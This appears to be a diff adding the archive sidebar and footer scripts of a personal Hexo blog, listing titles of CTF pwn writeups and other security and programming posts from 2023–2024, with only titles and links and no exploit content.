+            <span class="archive-post-date">08/31</span>
+            <a class="archive-post-title" href="/2024/08/31/xyctf/">xyctf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span>
+            <a class="archive-post-title" href="/2024/08/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">羊城杯2023部分题目复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/22</span>
+            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span>
+            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span>
+            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span>
+            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span>
+            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span>
+            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/25</span>
+            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/19</span>
+            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span>
+            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span>
+            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span>
+            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span>
+            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span>
+            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span>
+            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span>
+            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span>
+            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span>
+            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span>
+            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span>
+            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span>
+            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span>
+            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span>
+            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span>
+            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span>
+            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span>
+            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span>
+            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span>
+            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/11</span>
+            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span>
+            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span>
+            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span>
+            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/26</span>
+            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span>
+            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/19</span>
+            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/18</span>
+            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/04</span>
+            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span>
+            <a class="archive-post-title" href="/2024/01/02/cbctf/">cbctf</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/28</span>
+            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span>
+            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span>
+            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="ctf writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf writeup
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="misc">
+                <span class="iconfont-archer">&#xe606;</span>
+                misc
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://nyyyddddn.github.io",
+        root: siteMetaRoot,
+        author: "nyyyddddn"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
